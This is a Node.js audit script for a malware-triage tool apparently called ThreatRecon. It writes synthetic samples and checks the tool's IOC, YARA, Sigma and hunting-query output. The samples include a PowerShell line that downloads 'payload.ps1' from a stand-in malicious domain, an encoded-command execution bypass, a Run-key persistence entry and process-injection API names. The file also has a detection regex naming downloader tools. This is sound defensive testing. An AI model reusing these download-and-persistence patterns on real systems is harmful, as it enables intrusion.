import { createHash } from 'node:crypto';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  advancedDecode,
  buildActionableBlocklist,
  buildApiRisk,
  buildAttackTable,
  buildAttackTimeline,
  buildDetectionEngineering,
  buildIOCActionability,
  buildStringsIntelligence,
  generateDraftSigma,
  generateDraftYara,
  parsePE,
} from '../public/assets/js/advanced-analysis.js';
import { md5 } from '../public/assets/js/md5.js';
import {
  classifyStrings,
  extractEncodedBlobs,
  extractIOCs,
  extractPrintableStrings,
  isPrivateOrReservedIp,
  shannonEntropy,
} from '../public/assets/js/utils.js';
import {
  buildThreatIntelPivotRows,
  flattenSkippedThreatIntelPivots,
  flattenThreatIntelPivots,
} from '../public/assets/js/threat-intel-pivots.js';
import { BEHAVIOR_RULES, MITRE_MAP, YARA_RULES } from '../public/assets/js/rules.js';

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const SAMPLE_DIR = join(ROOT, 'test-samples');
const DOC_PATH = join(ROOT, 'docs', 'analyzer-accuracy-audit.md');

const SAMPLE1_HASH = 'abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789';
const SAMPLE2_DECODED = 'Write-Output "AuditSample2"; whoami /all';
const SAMPLE2_B64 = Buffer.from(SAMPLE2_DECODED, 'utf16le').toString('base64');

const SAMPLE1 = `ThreatRecon audit sample 1 - benign static IOC test.
Documentation IPs: 192.0.2.1 and 198.51.100.23
Domain: example-malicious-test.com
Registry: HKCU\\Software\\TestKey\\Run
Command: powershell -enc SQBFAFgA
SHA256-lookalike: ${SAMPLE1_HASH}
Suspicious string marker: Invoke-Expression is not executed in this text sample.
`;

const SAMPLE2 = `# ThreatRecon audit sample 2 - benign PowerShell text only
$Encoded = "${SAMPLE2_B64}"
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${SAMPLE2_B64}
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "AuditSample2" -Value "powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1"
Invoke-WebRequest -Uri "http://example-malicious-test.com/payload.ps1" -OutFile "$env:TEMP\\payload.ps1"
`;

function sample3Buffer() {
  const lowEntropy = Buffer.alloc(96, 0x41);
  const highEntropy = Buffer.from(Array.from({ length: 160 }, (_, i) => (i * 73 + 41) & 0xff));
  const embedded = Buffer.from(
    '\nMZ_AUDIT_SAMPLE_NOT_A_REAL_PE\0VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0' +
    'http://example-malicious-test.com/bin\0HKCU\\Software\\BinarySample\\Run\0powershell -enc SQBFAFgA\0',
    'latin1',
  );
  return Buffer.concat([lowEntropy, highEntropy, embedded, Buffer.alloc(64, 0x30)]);
}

function ensureSamples() {
  mkdirSync(SAMPLE_DIR, { recursive: true });
  writeFileSync(join(SAMPLE_DIR, 'sample1.txt'), SAMPLE1, 'utf8');
  writeFileSync(join(SAMPLE_DIR, 'sample2.ps1'), SAMPLE2, 'utf8');
  writeFileSync(join(SAMPLE_DIR, 'sample3.bin'), sample3Buffer());
}

function sha256Hex(input) {
  return createHash('sha256').update(input, 'utf8').digest('hex');
}

function sha1Hex(input) {
  return createHash('sha1').update(input, 'utf8').digest('hex');
}

function suspiciousCommands(input) {
  return String(input || '').split(/\n/).map(s => s.trim()).filter(s =>
    /(powershell|cmd\.exe|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|schtasks|vssadmin|curl|wget|python|subprocess|os\.system|invoke-webrequest|new-itemproperty)/i.test(s)
  ).slice(0, 8);
}

function buildHuntingQueries(iocs, commands) {
  const values = [
    ...(iocs.ips || []), ...(iocs.domains || []), ...(iocs.urls || []),
    ...(iocs.md5 || []), ...(iocs.sha1 || []), ...(iocs.sha256 || []),
    ...commands.map(c => c.slice(0, 120)),
  ].filter(Boolean).slice(0, 12);
  return values.map(v => ({
    value: v,
    splunk: `index=* "${v.replace(/"/g, '\\"')}"`,
    defender: `DeviceProcessEvents\n| where ProcessCommandLine contains "${v.replace(/"/g, '\\"')}"`,
    elastic: `process.command_line : "*${v.replace(/"/g, '\\"')}*"`,
  }));
}

function capabilityNames(behaviors, iocs, yaraHits) {
  const out = new Set();
  const labels = behaviors.map(b => b.label.toLowerCase()).join(' ');
  if (/download|staging|transfer/.test(labels)) out.add('Downloader/Stager');
  if (/registry|scheduled|persistence|run key/.test(labels) || (iocs.registry || []).length) out.add('Persistence');
  if (/encoded|obfuscat|base64/.test(labels) || yaraHits.some(y => /Base64|PowerShell/i.test(y.name))) out.add('Obfuscation/Evasion');
  if (/defender|tamper|disable/.test(labels)) out.add('Defense Evasion');
  if (/inject|remote thread|alloc/.test(labels)) out.add('Code Injection');
  if ((iocs.urls || []).length || (iocs.domains || []).length || (iocs.ips || []).length) out.add('Command & Control');
  return [...out];
}

function verdictFromScore(score) {
  if (score >= 80) return 'CRITICAL THREAT';
  if (score >= 55) return 'HIGH THREAT';
  if (score >= 30) return 'SUSPICIOUS';
  if (score >= 10) return 'POTENTIALLY UNWANTED';
  return 'LIKELY BENIGN';
}

function computeScore(behaviors, iocs, yaraHits, entropy, decodedCount, capabilityCount) {
  const behaviorRaw = behaviors.reduce((sum, b) => sum + (b.sev === 'CRITICAL' ? 20 : b.sev === 'HIGH' ? 12 : b.sev === 'MED' ? 6 : 2), 0);
  const beh = Math.min(behaviorRaw, 50);
  const iocScore = Math.min((iocs.ips || []).length * 5 + (iocs.urls || []).length * 4 + (iocs.domains || []).length * 3 +
    (iocs.onion || []).length * 6 + (iocs.md5 || []).length * 3 + (iocs.sha1 || []).length * 3 +
    (iocs.sha256 || []).length * 3 + (iocs.btc || []).length * 8 + (iocs.cve || []).length * 4, 20);
  const yaraScore = Math.min(yaraHits.length * 8, 18);
  const entScore = entropy >= 7.2 ? 10 : entropy >= 6.5 ? 6 : entropy >= 5.0 ? 3 : 0;
  const deobfScore = Math.min(decodedCount * 4, 12);
  const capScore = Math.min(capabilityCount * 3, 12);
  return { total: Math.min(beh + iocScore + yaraScore + entScore + deobfScore + capScore, 100), beh, iocScore, yaraScore, entScore, deobfScore, capScore };
}

function analyzeSample(name, input, byteLength) {
  const iocs = extractIOCs(input);
  const behaviors = BEHAVIOR_RULES.filter(r => r.rx.test(input));
  const yaraHits = YARA_RULES.filter(r => r.rx.test(input));
  const encoded = extractEncodedBlobs(input);
  const decoded = advancedDecode(input, encoded);
  const entropy = shannonEntropy(input);
  const peTriage = parsePE(input);
  const printableStrings = extractPrintableStrings(input, 4, 80);
  const classifiedStrings = classifyStrings(input);
  const stringsIntelligence = buildStringsIntelligence(input);
  const apiRisk = buildApiRisk(peTriage);
  const capabilities = capabilityNames(behaviors, iocs, yaraHits);
  const scores = computeScore(behaviors, iocs, yaraHits, entropy, decoded.length, capabilities.length);
  const mitreSet = new Set();
  behaviors.forEach(b => String(b.tech || '').split(',').map(t => t.trim()).filter(Boolean).forEach(t => mitreSet.add(t)));
  if ((iocs.ips || []).length || (iocs.urls || []).length || (iocs.domains || []).length) mitreSet.add('T1071');
  const mitreList = [...mitreSet].slice(0, 14);
  const attackTable = buildAttackTable(behaviors, mitreList, MITRE_MAP);
  const attackTimeline = buildAttackTimeline({ input, behaviors, peTriage, apiRisk });
  const draftYara = generateDraftYara({ iocs, category: 'Suspicious Script', apiRisk, stringsIntelligence, behaviors, isDemo: false });
  const draftSigma = generateDraftSigma(input, attackTable);
  const commands = suspiciousCommands(input);
  const huntingQueries = buildHuntingQueries(iocs, commands);
  const iocActionability = buildIOCActionability(iocs, false, undefined, isPrivateOrReservedIp);
  const blocklist = buildActionableBlocklist(iocActionability);
  const detectionEngineering = buildDetectionEngineering({ draftYara, draftSigma, huntingQueries, blocklist });
  const threatIntelPivotRows = buildThreatIntelPivotRows(iocActionability);
  const threatIntelPivots = flattenThreatIntelPivots(threatIntelPivotRows);
  const skippedThreatIntelPivots = flattenSkippedThreatIntelPivots(threatIntelPivotRows);
  const hashes = { md5: md5(input), sha1: sha1Hex(input), sha256: sha256Hex(input) };
  const reportJson = {
    sample: name,
    byteLength,
    hashes,
    entropy,
    score: scores.total,
    scoreBreakdown: scores,
    verdict: verdictFromScore(scores.total),
    staticMetadata: { byteLength, lines: input.split('\n').length, entropy, peTriage },
    printableStrings,
    classifiedStrings,
    stringsIntelligence,
    suspiciousApiDetection: { suspiciousApiStrings: peTriage.suspiciousApiStrings, apiRisk },
    iocs,
    iocActionability,
    mitre: mitreList,
    attackTable,
    attackTimeline,
    yaraHits: yaraHits.map(y => ({ name: y.name, desc: y.desc })),
    draftYara,
    draftSigma,
    huntingQueries,
    detectionEngineering,
    threatIntelPivots,
    skippedThreatIntelPivots,
    deobfuscated: decoded,
    blocklist,
  };
  const iocCsv = ['type,value,source,confidence,notes']
    .concat(iocActionability.map(row => [
      row.type,
      row.value,
      'ThreatRecon local extraction',
      row.confidence,
      `actionable=${row.actionable ? 'yes' : 'no'} | ${row.reason} | ${row.recommendedAction}`,
    ].map(csvEscape).join(','))).join('\n');
  const blocklistExport = [
    '# ThreatRecon blocklist export',
    '# Actionable public IPs, domains, URLs, and hashes only',
    '# Local/private, reserved documentation, demo/test, and known public resolver indicators are excluded.',
    ...(blocklist.length ? blocklist : ['# No actionable IOCs found.']),
  ].join('\n');
  const reportMarkdown = renderSampleMarkdown(reportJson);
  return { ...reportJson, exports: { markdown: reportMarkdown, json: JSON.stringify(reportJson, null, 2), iocCsv, blocklist: blocklistExport, yara: draftYara, sigma: draftSigma } };
}

function csvEscape(value) {
  const s = String(value ?? '');
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

function renderSampleMarkdown(r) {
  return `# ThreatRecon Triage Report - ${r.sample}

## Static Metadata
- Byte length: ${r.byteLength}
- MD5: ${r.hashes.md5}
- SHA-1: ${r.hashes.sha1}
- SHA-256: ${r.hashes.sha256}
- Entropy: ${r.entropy.toFixed(3)} bits/byte
- PE type: ${r.staticMetadata.peTriage.fileType}
- PE imports: ${(r.staticMetadata.peTriage.imports || []).join(', ') || 'none parsed'}
- Suspicious API strings: ${(r.staticMetadata.peTriage.suspiciousApiStrings || []).join(', ') || 'none'}

## IOCs
${Object.entries(r.iocs).filter(([, values]) => values.length).map(([key, values]) => `### ${key}\n${values.join('\n')}`).join('\n\n') || 'none'}

## MITRE ATT&CK
${r.attackTable.map(row => `- ${row.tactic} | ${row.techniqueId} ${row.techniqueName} | Evidence: ${row.observedEvidence} | Confidence: ${row.confidence}`).join('\n') || 'none'}

## YARA Draft
\`\`\`yara
${r.draftYara}
\`\`\`

## Sigma Draft
\`\`\`yaml
${r.draftSigma}
\`\`\`

## Hunting Queries
${r.huntingQueries.map(q => `- ${q.value}\n  - Splunk: ${q.splunk}\n  - Defender: ${q.defender.replace(/\n/g, ' ')}\n  - Elastic: ${q.elastic}`).join('\n') || 'none'}`;
}

function readSamples() {
  return [
    ['sample1.txt', readFileSync(join(SAMPLE_DIR, 'sample1.txt'), 'utf8'), readFileSync(join(SAMPLE_DIR, 'sample1.txt')).length],
    ['sample2.ps1', readFileSync(join(SAMPLE_DIR, 'sample2.ps1'), 'utf8'), readFileSync(join(SAMPLE_DIR, 'sample2.ps1')).length],
    ['sample3.bin', readFileSync(join(SAMPLE_DIR, 'sample3.bin')).toString('latin1'), readFileSync(join(SAMPLE_DIR, 'sample3.bin')).length],
  ];
}

function verificationSection(results) {
  const s1 = results.find(r => r.sample === 'sample1.txt');
  const s2 = results.find(r => r.sample === 'sample2.ps1');
  const s3 = results.find(r => r.sample === 'sample3.bin');
  const sample1Ips = [...(s1.iocs.ips || []), ...(s1.iocs.localIndicators || [])].sort();
  const sample1ExpectedIps = ['192.0.2.1', '198.51.100.23'].sort();
  const checks = [
    ['sample1 IPs exact', JSON.stringify(sample1Ips) === JSON.stringify(sample1ExpectedIps), `${sample1Ips.join(', ')}`],
    ['sample1 domain exact', (s1.iocs.domains || []).includes('example-malicious-test.com'), (s1.iocs.domains || []).join(', ')],
    ['sample1 registry exact', (s1.iocs.registry || []).includes('HKCU\\Software\\TestKey\\Run'), (s1.iocs.registry || []).join(', ')],
    ['sample1 hash exact', (s1.iocs.sha256 || []).includes(SAMPLE1_HASH), (s1.iocs.sha256 || []).join(', ')],
    ['sample1 YARA references actual sample string', /HKCU\\\\Software\\\\TestKey\\\\Run|powershell -enc|example-malicious-test\.com/.test(s1.draftYara), 'checked YARA strings'],
    ['sample1 Sigma references command or registry pattern', /HKCU\\\\Software\\\\TestKey\\\\Run|powershell -enc|SQBFAFgA/.test(s1.draftSigma), 'checked Sigma terms'],
    ['sample2 base64 decoded', s2.deobfuscated.some(d => d.decoded.includes(SAMPLE2_DECODED)), s2.deobfuscated.map(d => d.decoded).join(' | ')],
    ['sample2 PowerShell MITRE', s2.attackTable.some(r => r.techniqueId === 'T1059.001'), s2.attackTable.map(r => r.techniqueId).join(', ')],
    ['sample3 entropy from byte content', s3.entropy > 3 && s3.entropy < 8, s3.entropy.toFixed(3)],
    ['sample3 embedded strings extracted', s3.printableStrings.some(s => s.includes('VirtualAllocEx')) && s3.printableStrings.some(s => s.includes('example-malicious-test.com')), s3.printableStrings.slice(0, 12).join(' | ')],
  ];
  return checks.map(([name, pass, detail]) => `- ${pass ? 'PASS' : 'FAIL'}: ${name} (${detail})`).join('\n');
}

const AUDIT_ROWS = [
  ['Static metadata', 'B - PARTIALLY REAL', '`public/assets/js/app.js` `runAnalysisPipeline()`, `renderStatic()`; `public/assets/js/advanced-analysis.js` `parsePE()`', 'Documented as limitation'],
  ['Strings extraction', 'A - REAL', '`public/assets/js/utils.js` `extractPrintableStrings()`, `classifyStrings()`; `public/assets/js/advanced-analysis.js` `buildStringsIntelligence()`', 'Fixed'],
  ['Suspicious API detection', 'B - PARTIALLY REAL', '`public/assets/js/advanced-analysis.js` `parsePE()`, `buildApiRisk()`', 'Documented as limitation'],
  ['IOC extraction', 'A - REAL', '`public/assets/js/utils.js` `extractIOCs()`; `public/assets/js/advanced-analysis.js` `buildIOCActionability()`', 'Fixed'],
  ['MITRE ATT&CK mapping', 'B - PARTIALLY REAL', '`public/assets/js/app.js` `runAnalysisPipeline()`; `public/assets/js/advanced-analysis.js` `buildAttackTable()`', 'Documented as limitation'],
  ['YARA draft generation', 'B - PARTIALLY REAL', '`public/assets/js/advanced-analysis.js` `generateDraftYara()`', 'Documented as limitation'],
  ['Sigma draft generation', 'B - PARTIALLY REAL', '`public/assets/js/advanced-analysis.js` `generateDraftSigma()`', 'Fixed'],
  ['Threat hunting query generation', 'B - PARTIALLY REAL', '`public/assets/js/app.js` `buildHuntingQueries()`; `public/assets/js/advanced-analysis.js` `buildDetectionEngineering()`', 'Documented as limitation'],
  ['Analyst report export', 'B - PARTIALLY REAL', '`public/assets/js/app.js` `generateAnalystReport()`, `exportMarkdown()`, `exportJSON()`, `exportIOCCSV()`, `exportBlocklist()`, `exportYARA()`, `exportSigma()`', 'Documented as limitation'],
];

const SOURCE_TRACE = [
  ['Static metadata', 'Input comes from `FileReader` in `handleFile()`, is stored in `fileContent`, then hashed with local SHA/MD5 helpers, entropy is computed with `shannonEntropy(input)`, and PE structure is parsed by `parsePE(input)`. `parsePE()` reads MZ/PE headers, section table fields, entropy per section, import/export tables when parsable, and scans actual bytes for suspicious API strings.'],
  ['Strings extraction', 'Input is scanned with printable ASCII extraction (`extractPrintableStrings()` and `buildStringsIntelligence()`), then categorized by regex. This now works for text and binary blobs represented as browser byte strings.'],
  ['Suspicious API detection', '`parsePE()` collects actual parsed imports when the PE import table can be read and scans the full input for known API names. `buildApiRisk()` marks each API as `real import` or `string only`.'],
  ['IOC extraction', '`extractIOCs(input)` uses local regexes for IPs, URLs, defanged URLs/domains, hashes, emails, registry keys, paths, BTC/CVE values, and mutexes. `buildIOCActionability()` separates private/reserved/demo indicators from actionable blocklist candidates.'],
  ['MITRE ATT&CK mapping', '`BEHAVIOR_RULES` regexes match the input and carry technique IDs. `buildAttackTable()` turns matched behavior evidence into tactic/technique/confidence rows and adds IOC/static-context T1071 when network indicators are present.'],
  ['YARA draft generation', '`generateDraftYara()` selects actual matched behavior labels, suspicious APIs, registry paths, file paths, mutexes, URLs, domains, and high-signal strings, then emits a draft YARA rule around those strings.'],
  ['Sigma draft generation', '`generateDraftSigma()` matches local Sigma pattern regexes, then includes exact extracted registry/URL/domain/path values and matched command lines in `CommandLine|contains` terms.'],
  ['Threat hunting query generation', '`buildHuntingQueries()` takes extracted IOCs plus suspicious command lines and substitutes them into Splunk, Defender KQL, and Elastic templates. `buildDetectionEngineering()` also carries blocklists and hash hunt suggestions.'],
  ['Analyst report export', '`generateAnalystReport()` and export functions serialize the computed local analysis state into Markdown, JSON, IOC CSV, blocklist, YARA, and Sigma client-side blobs.'],
];

const LIMITATIONS = [
  ['Static metadata', 'Hashes, entropy, byte/line counts, and lightweight PE parsing are real. Full file-type identification, rich PE import recovery, resource parsing, certificates, rich headers, overlay classification, and archive/document parsers are not implemented. Making this fully real would require a broader client-side parser set and significant engineering, but no paid API.'],
  ['Suspicious API detection', 'API detection is real for parsed imports and literal API strings, but it cannot recover dynamically resolved imports, packed code, obfuscated names, or shellcode imports. Fully fixing this would require deeper binary parsing/unpacking/emulation, which is large and outside a browser-only quick fix.'],
  ['MITRE ATT&CK mapping', 'Mappings are rule-based from actual matched static evidence. They are not behavioral telemetry and cannot prove runtime execution or tactic intent. Fully real ATT&CK mapping would require dynamic sandbox/EDR telemetry or extensive local emulation, which is intentionally not added.'],
  ['YARA draft generation', 'The draft contains real strings from the sample, but the rule shell, metadata, and condition are templated and require analyst tuning. A production-quality YARA generator would require string scoring, false-positive testing, and corpus validation.'],
  ['Threat hunting query generation', 'Queries include actual IOCs/commands, but field choices and indexes are generic templates. Fully real customer-ready hunts require environment-specific schemas, data sources, and validation against SIEM/EDR telemetry.'],
  ['Analyst report export', 'Exports serialize real computed analyzer outputs, but narrative sections and recommendations are templated. A fully real incident report requires case context, host telemetry, dynamic analysis, and analyst conclusions.'],
];

function renderDoc(results) {
  const rows = AUDIT_ROWS.map(r => `| ${r[0]} | ${r[1]} | ${r[2]} | ${r[3]} |`).join('\n');
  const traces = SOURCE_TRACE.map(([name, text]) => `### ${name}\n${text}`).join('\n\n');
  const limitations = LIMITATIONS.map(([name, text]) => `### ${name}\n${text}`).join('\n\n');
  const dumps = results.map(renderOutputDump).join('\n\n');
  return `# Analyzer Accuracy Audit

Generated locally by \`scripts/analyzer-accuracy-audit.mjs\`.

## Classification Table
| Output Type | Classification (A/B/C/D) | File/Function | Status |
| --- | --- | --- | --- |
${rows}

## Source Trace and Data Flow
${traces}

## Documented Limitations
${limitations}

## Verification Checks
${verificationSection(results)}

## Full Output Dumps
${dumps}
`;
}

function codeBlock(lang, value) {
  return `\`\`\`${lang}\n${String(value).replace(/```/g, '`\\`\\`')}\n\`\`\``;
}

function renderOutputDump(r) {
  return `# ${r.sample}

## 1. Static Metadata
${codeBlock('json', JSON.stringify(r.staticMetadata, null, 2))}

## 2. Strings Extraction
### Printable Strings
${codeBlock('text', r.printableStrings.join('\n') || 'none')}
### Classified Strings
${codeBlock('json', JSON.stringify(r.classifiedStrings, null, 2))}
### Strings Intelligence
${codeBlock('json', JSON.stringify(r.stringsIntelligence, null, 2))}

## 3. Suspicious API Detection
${codeBlock('json', JSON.stringify(r.suspiciousApiDetection, null, 2))}

## 4. IOC Extraction
${codeBlock('json', JSON.stringify({ iocs: r.iocs, actionability: r.iocActionability, threatIntelPivots: r.threatIntelPivots, skippedThreatIntelPivots: r.skippedThreatIntelPivots }, null, 2))}

## 5. MITRE ATT&CK Mapping
${codeBlock('json', JSON.stringify({ mitre: r.mitre, attackTable: r.attackTable, attackTimeline: r.attackTimeline }, null, 2))}

## 6. YARA Draft Rule
${codeBlock('yara', r.draftYara)}

## 7. Sigma Draft Rule
${codeBlock('yaml', r.draftSigma)}

## 8. Threat Hunting Output
${codeBlock('json', JSON.stringify({ huntingQueries: r.huntingQueries, detectionEngineering: r.detectionEngineering }, null, 2))}

## 9. Analyst Report Exports
### Markdown
${codeBlock('markdown', r.exports.markdown)}
### JSON
${codeBlock('json', r.exports.json)}
### IOC CSV
${codeBlock('csv', r.exports.iocCsv)}
### Blocklist
${codeBlock('text', r.exports.blocklist)}
### YARA
${codeBlock('yara', r.exports.yara)}
### Sigma
${codeBlock('yaml', r.exports.sigma)}
`;
}

ensureSamples();
const results = readSamples().map(([name, input, byteLength]) => analyzeSample(name, input, byteLength));
mkdirSync(dirname(DOC_PATH), { recursive: true });
writeFileSync(DOC_PATH, renderDoc(results), 'utf8');
console.log(`Wrote ${DOC_PATH}`);
console.log(verificationSection(results));
